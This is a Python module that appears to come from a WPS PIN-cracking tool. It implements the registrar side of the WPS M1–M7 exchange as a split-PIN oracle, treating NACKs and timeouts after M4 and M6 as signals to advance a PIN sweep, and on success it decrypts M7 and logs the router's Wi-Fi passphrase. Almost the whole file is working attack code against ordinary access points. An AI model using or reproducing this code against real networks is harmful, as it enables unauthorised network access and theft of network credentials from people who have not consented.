"""WpsRegistrar — the per-PIN EAP/WSC state machine (transport-agnostic).

Drives one PIN attempt as an external WPS Registrar against an Enrollee (the
AP). Knows nothing about USB: it is handed a transport with ``send(frame)`` /
``recv(timeout)`` and builds/parses full 802.11 data frames via ``messages``.
The live adapter (``association.WlanTransport``) wires this to
``WlanInterface.send_raw`` + ``register_rx_callback``; tests wire it to an
in-process fake enrollee.

The split-PIN oracle, mapped from what arrives after each message we send:

    after M4 :  M5  -> first half correct      NACK/EAP-FAIL/timeout -> FIRST_HALF_WRONG
    after M6 :  M7  -> SUCCESS (extract PSK)    NACK/EAP-FAIL/timeout -> SECOND_HALF_WRONG

Timeout-as-NACK (reaver's default for the M5/M7 waits) lets the sweep advance
against APs that silently drop instead of NACKing.
"""

from __future__ import annotations

import logging
import os
import time
from dataclasses import dataclass
from enum import Enum
from typing import Optional, Protocol

from . import messages as M
from . import wsc_crypto as wc

logger = logging.getLogger(__name__)


class WpsTransport(Protocol):
    async def send(self, frame: bytes) -> None: ...
    async def recv(self, timeout: float) -> Optional[bytes]: ...


class PinResult(Enum):
    SUCCESS = "success"
    FIRST_HALF_WRONG = "first_half_wrong"
    SECOND_HALF_WRONG = "second_half_wrong"
    TIMEOUT = "timeout"
    PROTO_ERROR = "proto_error"           # rejected before the M4 oracle (e.g. locked)
    ABORTED = "aborted"                   # cooperatively stopped mid-exchange (user Stop)


@dataclass
class AttemptOutcome:
    result: PinResult
    pin: str = ""
    psk: Optional[str] = None             # Network Key recovered from M7, on SUCCESS
    ssid: Optional[str] = None
    detail: str = ""
    config_error: Optional[int] = None    # WSC ATTR_CONFIG_ERROR from a NACK — the AP's stated reason
    reached_m1: bool = False              # did the AP start the WSC exchange (send M1) at all?

    @property
    def first_half_ok(self) -> bool:
        return self.result in (PinResult.SECOND_HALF_WRONG, PinResult.SUCCESS)


# WSC Config Error codes (WSC spec, ATTR_CONFIG_ERROR) — surfaced from a NACK so a
# failure says *why*, not just "refused". 15 = the AP is telling us it's locked; 18 is
# the closest thing to "wrong/rejected PIN". Which code(s) actually mean "advance past
# this PIN" is AP-dependent and confirmed from hardware before we key advancement off it.
WSC_CONFIG_ERRORS = {
    0: "No Error", 1: "OOB Interface Read Error", 2: "Decryption CRC Failure",
    3: "2.4GHz chan not supported", 4: "5GHz chan not supported", 5: "Signal too weak",
    6: "Network auth failure", 7: "Network assoc failure", 8: "No DHCP response",
    9: "Failed DHCP config", 10: "IP address conflict", 11: "Couldn't reach Registrar",
    12: "Multiple PBC sessions", 13: "Rogue activity suspected", 14: "Device busy",
    15: "Setup Locked", 16: "Message Timeout", 17: "Registration Session Timeout",
    18: "Device Password Auth Failure",
}


def config_error_name(code: Optional[int]) -> str:
    if code is None:
        return "none"
    return WSC_CONFIG_ERRORS.get(code, f"unknown(0x{code:02x})")


class WpsRegistrar:
    def __init__(
        self,
        transport: WpsTransport,
        bssid: bytes,
        our_mac: bytes,
        msg_timeout: float = 3.0,
        eapol_start_timeout: float = 2.0,
        overall_timeout: float = 25.0,
        log=None,
    ):
        self.t = transport
        self.bssid = bssid
        self.our_mac = our_mac
        # Per-message receive window. A cheap AP can take seconds to compute the
        # next WSC message (DH + key derivation), so this is deliberately
        # generous; bully seeds its M3 wait in the tens of seconds.
        self.msg_timeout = msg_timeout
        self.eapol_start_timeout = eapol_start_timeout
        self.overall_timeout = overall_timeout
        self.log = log or logger.debug

    async def _send_1x(self, payload_1x: bytes) -> None:
        frame = M.build_data_frame(self.bssid, self.our_mac, self.bssid, payload_1x)
        await self.t.send(frame)

    async def try_pin(self, pin: str) -> AttemptOutcome:
        """Run one full EAPOL-Start→M1..M7 exchange for ``pin``."""
        # Fresh per-attempt session state.
        priv, pkr = wc.dh_generate_keypair()
        nonce_r = os.urandom(wc.NONCE_LEN)
        uuid_r = os.urandom(16)
        r_s1 = os.urandom(wc.SECRET_NONCE_LEN)
        r_s2 = os.urandom(wc.SECRET_NONCE_LEN)

        pke = nonce_e = authkey = keywrapkey = psk1 = psk2 = None
        last_sent: Optional[str] = None         # 'M4' or 'M6' — what the oracle is pending on
        # Highest WSC message type handled. WSC never runs backward, so a
        # received message older than this is a stale (no-ACK) retransmit — we
        # answer the *current* stage (retry insurance) but ignore older ones,
        # rather than re-emitting a stale M2 after we've moved on to M4.
        highest_mt = 0
        reached_m1 = False           # did the AP send M1 (WSC exchange actually started)?

        def _out(result: PinResult, **kw) -> AttemptOutcome:
            # Every outcome carries reached_m1 so the campaign can tell a silent AP
            # (never talked WSC) from one that rejected mid-exchange.
            return AttemptOutcome(result, pin, reached_m1=reached_m1, **kw)

        await self._send_1x(M.eapol_start())
        self.log(f"[WPS] -> EAPOL-Start (pin {pin})")

        # The AP retransmits each message because our injected STA never sends an
        # 802.11 ACK (it's not a firmware-level client, so hardware auto-ACK never
        # fires). We reply to every retransmit of the CURRENT stage — our only
        # delivery insurance, since we TX no-ACK — but the stale-message guard
        # below drops retransmits of stages we've already passed.
        overall_deadline = time.monotonic() + self.overall_timeout
        timeout = self.eapol_start_timeout
        while time.monotonic() < overall_deadline:
            frame = await self.t.recv(min(timeout, overall_deadline - time.monotonic()))
            timeout = self.msg_timeout
            if frame is None:
                # No reply within the window. After M4/M6 a silent drop is the
                # half-wrong oracle (reaver's timeout-as-NACK); otherwise the AP
                # just isn't talking.
                # Distinguish an explicit NACK (logged above) from timeout-as-NACK: a
                # *silent* drop after M4/M6 is only ASSUMED wrong. If a correct first half
                # ever reads as wrong, this is the line to look for — it means the AP's M5
                # never reached us (lost/late), not that it said no.
                if last_sent == "M4":
                    self.log("[WPS] no reply after M4 → assuming first-half-wrong "
                             "(timeout-as-NACK; an M5 may have been lost)")
                    return _out(PinResult.FIRST_HALF_WRONG, detail="no reply after M4")
                if last_sent == "M6":
                    self.log("[WPS] no reply after M6 → assuming second-half-wrong "
                             "(timeout-as-NACK)")
                    return _out(PinResult.SECOND_HALF_WRONG, detail="no reply after M6")
                return _out(PinResult.TIMEOUT, detail="AP didn't respond")

            p = M.parse_rx_frame(frame)
            if p is None:
                # An EAPOL frame we couldn't parse, arriving mid-exchange, is suspicious —
                # a malformed/unexpected M5 would look exactly like this and otherwise be
                # dropped silently (a false first-half-wrong). Beacons/data (no EAPOL
                # LLC/SNAP) stay quiet.
                if (highest_mt or last_sent) and M._LLC_SNAP_EAPOL in frame:
                    self.log(f"[WPS] <- UNPARSED EAPOL ({len(frame)}B, last_sent={last_sent}): "
                             f"{frame[:48].hex()}")
                continue

            if p.is_identity_request:
                if highest_mt == 0:          # ignore identity retransmits once WSC starts
                    self.log(f"[WPS] <- EAP-Req/Identity (id {p.eap_id}); -> Identity response")
                    await self._send_1x(M.eap_identity_response(p.eap_id))
                continue

            if p.is_eap_failure or p.wsc_msg_type == M.WPS_WSC_NACK:
                # De-swallow the AP's stated reason. A NACK is the AP *answering* with a
                # config-error code (≠ silence); a timeout is "AP didn't respond".
                ce_raw = p.attrs.get(M.ATTR_CONFIG_ERROR)
                config_error = (int.from_bytes(ce_raw[:2], "big")
                                if ce_raw and len(ce_raw) >= 2 else None)
                kind = "EAP-FAIL" if p.is_eap_failure else "WSC_NACK"
                self.log(f"[WPS] <- {kind} config_error={config_error_name(config_error)} "
                         f"(last_sent={last_sent})")
                if last_sent == "M4":
                    return _out(PinResult.FIRST_HALF_WRONG, detail="NACK after M4",
                                config_error=config_error)
                if last_sent == "M6":
                    return _out(PinResult.SECOND_HALF_WRONG, detail="NACK after M6",
                                config_error=config_error)
                return _out(PinResult.PROTO_ERROR, detail="NACK before oracle",
                            config_error=config_error)

            mt = p.wsc_msg_type
            if mt and mt < highest_mt:
                # Stale retransmit of a stage we've already passed. Surfaced because a real
                # M5 (0x05) dropped here would read as a false first-half-wrong.
                self.log(f"[WPS] <- stale msg_type=0x{mt:02x} (< 0x{highest_mt:02x}), "
                         f"dropping (last_sent={last_sent})")
                continue
            if mt in (M.WPS_M1, M.WPS_M3, M.WPS_M5, M.WPS_M7):
                highest_mt = mt
            if mt == M.WPS_M1:
                reached_m1 = True        # the AP is talking WSC, whatever happens next
                pke = p.attrs.get(M.ATTR_PUBLIC_KEY)
                nonce_e = p.attrs.get(M.ATTR_ENROLLEE_NONCE)
                mac_e = p.attrs.get(M.ATTR_MAC_ADDR, self.bssid)
                if not pke or not nonce_e:
                    return _out(PinResult.PROTO_ERROR, detail="M1 missing PKe/nonce")
                shared = wc.dh_shared_secret(pke, priv)
                authkey, keywrapkey, _ = wc.derive_keys(shared, nonce_e, mac_e, nonce_r)
                psk1, psk2 = wc.derive_psk(authkey, pin)
                m2 = M.build_m2(nonce_e, nonce_r, uuid_r, pkr, authkey, p.raw_wsc_attrs)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m2))
                self.log(f"[WPS] <- M1 (id {p.eap_id}, {len(p.raw_wsc_attrs)}B); -> M2")

            elif mt == M.WPS_M3:
                if authkey is None:
                    return _out(PinResult.PROTO_ERROR, detail="M3 before keys")
                m4 = M.build_m4(nonce_e, r_s1, r_s2, psk1, psk2, pke, pkr,
                                authkey, keywrapkey, p.raw_wsc_attrs)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m4))
                last_sent = "M4"
                self.log(f"[WPS] <- M3 (id {p.eap_id}); -> M4 (revealing R-S1, testing first half)")

            elif mt == M.WPS_M5:
                # First half accepted. Reveal R-S2 in M6 to test the second half.
                m6 = M.build_m6(nonce_e, r_s2, authkey, keywrapkey, p.raw_wsc_attrs)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m6))
                last_sent = "M6"
                self.log(f"[WPS] <- M5 (id {p.eap_id}) -> first half CORRECT; -> M6 (testing second half)")

            elif mt == M.WPS_M7:
                ssid, psk = self._extract_psk(p, keywrapkey)
                self.log(f"[WPS] <- M7 (id {p.eap_id}) -> SUCCESS; PSK={psk!r}")
                # Tear the session down politely (best-effort).
                nack = M.build_wsc_nack(nonce_e, nonce_r)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_NACK, nack))
                return _out(PinResult.SUCCESS, psk=psk, ssid=ssid)

            else:
                # M2D or unexpected — treat as a setup rejection (often a lock).
                if mt == M.WPS_M2D:
                    return _out(PinResult.PROTO_ERROR, detail="M2D (AP has no registrar)")
                self.log(f"[WPS] <- unexpected msg_type=0x{mt:02x}, ignoring")
                continue

        return _out(PinResult.TIMEOUT, detail="AP didn't respond (exchange stalled)")

    @staticmethod
    def _extract_psk(p, keywrapkey):
        enc = p.attrs.get(M.ATTR_ENCR_SETTINGS)
        if not enc or keywrapkey is None:
            return None, None
        creds = M.extract_m7_credentials(enc, keywrapkey)
        if not creds:
            return None, None
        ssid = creds.get("ssid")
        key = creds.get("network_key")
        return (
            ssid.decode("utf-8", "replace") if ssid else None,
            key.decode("utf-8", "replace") if key else None,
        )
